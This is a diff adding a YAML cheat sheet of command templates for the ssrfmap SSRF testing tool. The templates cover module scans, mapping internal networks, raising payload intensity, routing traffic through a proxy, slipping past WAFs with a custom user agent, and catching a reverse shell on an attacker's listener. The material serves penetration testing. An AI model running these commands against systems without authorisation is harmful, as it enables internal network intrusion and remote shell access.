@@ -1,0 +1,65 @@
+tool: ssrfmap
+tags: [security, pentest, ssrf, web, exploitation, enumeration, network]
+
+actions:
+  # === RECONNAISSANCE AND ENUMERATION ===
+
+  - title: ssrfmap - basic module scan
+    desc: |
+      Perform a basic scan using specific modules against a target parameter in a request file. 
+      This is the primary way to use the tool, where you provide a raw HTTP request saved in a file and identify the injectable parameter.
+      The tool will then iterate through the selected modules to find vulnerabilities like port scanning or cloud metadata access.
+      Always ensure the request file reflects a valid HTTP request where the SSRF is suspected.
+    command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}}"
+
+  - title: ssrfmap - internal network discovery
+    desc: |
+      Use the network module to discover accessible internal IP addresses and services. 
+      By providing an internal IP range or specific target via the lhost flag, the tool attempts to map the internal perimeter from the server's perspective.
+      This is crucial for pivoting and identifying databases or admin panels not exposed to the internet.
+      Note that this can be noisy and might trigger internal intrusion detection systems.
+    command: "ssrfmap -r {{request_file}} -p {{parameter}} -m network --lhost {{internal_target_ip}}"
+
+  - title: ssrfmap - increase testing intensity
+    desc: |
+      Increase the testing level to perform more comprehensive and aggressive SSRF probes.
+      The level argument (ranging from 1 to 5) determines the complexity and quantity of the payloads sent to the target.
+      Higher levels are useful when simple filters are in place but may significantly increase the number of requests sent to the server.
+      Use level 1 for quick checks and higher levels if initial results are inconclusive.
+    command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} --level {{level|3}}"
+
+  # === EXPLOITATION ===
+
+  - title: ssrfmap - reverse shell with handler
+    desc: |
+      Attempt to gain a reverse shell by using an exploit module and starting a local handler.
+      The -l flag initiates a listener on the attacker's machine to catch the incoming connection from the target.
+      You must specify the attacker's IP (lhost) and the desired port (lport) for the connection to be established successfully.
+      This action usually requires a specific module that supports remote code execution or file inclusion via SSRF.
+    command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{exploit_module}} -l {{handler_port|4444}} --lhost {{attacker_ip}} --lport {{attacker_port|4444}}"
+
+  # === ADVANCED CONFIGURATION ===
+
+  - title: ssrfmap - proxy integration for debugging
+    desc: |
+      Route all outbound traffic from ssrfmap through a specified HTTP/S proxy like Burp Suite.
+      This allows you to intercept, inspect, and manually modify the payloads being sent by the tool to the target.
+      It is an essential technique for debugging why a specific module might be failing or for bypassing complex WAF rules.
+      Ensure the proxy address and port match your local intercepting proxy settings.
+    command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} --proxy {{proxy_url|http://127.0.0.1:8080}}"
+
+  - title: ssrfmap - bypass filters with custom user-agent and SSL
+    desc: |
+      Enable SSL support and use a custom User-Agent string to bypass basic security filters or WAFs.
+      The --ssl flag allows the tool to communicate with HTTPS endpoints even if the certificates are self-signed or invalid.
+      Setting a custom User-Agent helps the tool's traffic blend in with regular browser traffic, reducing the chance of being blocked.
+      This is particularly useful when targeting enterprise environments with strict header inspection.
+    command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} --ssl --uagent \"{{user_agent|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36}}\""
+
+  - title: ssrfmap - verbose output for troubleshooting
+    desc: |
+      Enable verbose mode to see detailed information about the requests and responses during the scanning process.
+      Verbosity is highly recommended when a module is not returning expected results or when you need to see the exact payloads being generated.
+      It provides insights into timeouts, connection errors, and the logic being applied by the tool's modules.
+      Use this during the initial phases of an assessment to ensure the tool is configured correctly.
+    command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} -v"
